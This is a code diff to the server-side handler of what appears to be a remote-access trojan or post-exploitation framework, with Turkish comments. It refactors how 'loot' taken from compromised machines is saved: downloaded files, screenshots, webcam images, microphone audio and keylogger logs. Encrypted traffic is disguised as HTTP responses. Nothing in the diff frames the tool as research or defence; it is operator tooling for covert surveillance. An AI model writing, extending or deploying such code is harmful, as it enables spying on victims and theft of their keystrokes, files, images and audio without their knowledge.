@@ -200,6 +200,22 @@ class Handler(BaseHandler):
         """
         self.interactive_session()
 
+    def _loot_save_path(self, filename: str, category: str = "downloads") -> str:
+        """Aktif workspace loot'una kaydet; yoksa CWD (geriye uyumlu)."""
+        try:
+            from core.workspace_manager import get_workspace_manager
+
+            wm = get_workspace_manager()
+            if wm and wm.active_name:
+                return str(wm.resolve_save_path(filename, category=category))
+        except Exception:
+            pass
+        if category in ("screenshots", "media", "logs"):
+            d = os.path.join(os.getcwd(), category)
+            os.makedirs(d, exist_ok=True)
+            return os.path.join(d, filename)
+        return os.path.join(os.getcwd(), filename)
+
     def send_data(self, data: str):
         """HTTP Response olarak şifreli veri gönderir."""
         if not self.client_sock:
@@ -635,11 +651,12 @@ class Handler(BaseHandler):
                             continue
 
                         remote_path = parts[1]
-                        local_path = (
-                            parts[2]
-                            if len(parts) > 2
-                            else os.path.basename(remote_path)
-                        )
+                        if len(parts) > 2:
+                            local_path = parts[2]
+                        else:
+                            local_path = self._loot_save_path(
+                                os.path.basename(remote_path), category="downloads"
+                            )
 
                         self.send_data(f"file_size {remote_path}")
                         resp = self.recv_data()
@@ -779,8 +796,9 @@ class Handler(BaseHandler):
                             else:
                                 filename = f"downloaded_{int(time.time())}.bin"
 
-                            # Varsa download klasörüne kaydet, yoksa current dir
-                            save_path = os.path.join(os.getcwd(), filename)
+                            save_path = self._loot_save_path(
+                                filename, category="downloads"
+                            )
 
                             with open(save_path, "wb") as f:
                                 f.write(file_content)
@@ -797,10 +815,6 @@ class Handler(BaseHandler):
                             b64_data = response.split(":", 1)[1]
                             img_data = base64.b64decode(b64_data)
 
-                            # screenshots klasörünü oluştur
-                            screenshots_dir = os.path.join(os.getcwd(), "screenshots")
-                            os.makedirs(screenshots_dir, exist_ok=True)
-
                             # Dosya formatını belirle (BMP veya PNG)
                             if img_data[:2] == b"BM":
                                 ext = "bmp"
@@ -812,7 +826,9 @@ class Handler(BaseHandler):
                             filename = (
                                 f"screenshot_{timestamp}_session{self.session_id}.{ext}"
                             )
-                            save_path = os.path.join(screenshots_dir, filename)
+                            save_path = self._loot_save_path(
+                                filename, category="screenshots"
+                            )
 
                             with open(save_path, "wb") as f:
                                 f.write(img_data)
@@ -837,14 +853,13 @@ class Handler(BaseHandler):
                             b64_data = response.split(":", 1)[1]
                             img_data = base64.b64decode(b64_data)
 
-                            media_dir = os.path.join(os.getcwd(), "media")
-                            os.makedirs(media_dir, exist_ok=True)
-
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                             filename = (
                                 f"webcam_{timestamp}_session{self.session_id}.jpeg"
                             )
-                            save_path = os.path.join(media_dir, filename)
+                            save_path = self._loot_save_path(
+                                filename, category="media"
+                            )
 
                             with open(save_path, "wb") as f:
                                 f.write(img_data)
@@ -860,12 +875,11 @@ class Handler(BaseHandler):
                             b64_data = response.split(":", 1)[1]
                             wav_data = base64.b64decode(b64_data)
 
-                            media_dir = os.path.join(os.getcwd(), "media")
-                            os.makedirs(media_dir, exist_ok=True)
-
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                             filename = f"audio_{timestamp}_session{self.session_id}.wav"
-                            save_path = os.path.join(media_dir, filename)
+                            save_path = self._loot_save_path(
+                                filename, category="media"
+                            )
 
                             with open(save_path, "wb") as f:
                                 f.write(wav_data)
@@ -881,15 +895,13 @@ class Handler(BaseHandler):
                             b64_logs = response.split(":", 1)[1]
                             logs = base64.b64decode(b64_logs).decode("utf-8")
 
-                            # logs klasörünü oluştur
-                            logs_dir = os.path.join(os.getcwd(), "logs")
-                            os.makedirs(logs_dir, exist_ok=True)
-
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                             filename = (
                                 f"keylog_{timestamp}_session{self.session_id}.txt"
                             )
-                            save_path = os.path.join(logs_dir, filename)
+                            save_path = self._loot_save_path(
+                                filename, category="logs"
+                            )
 
                             with open(save_path, "w", encoding="utf-8") as f:
                                 f.write(logs)
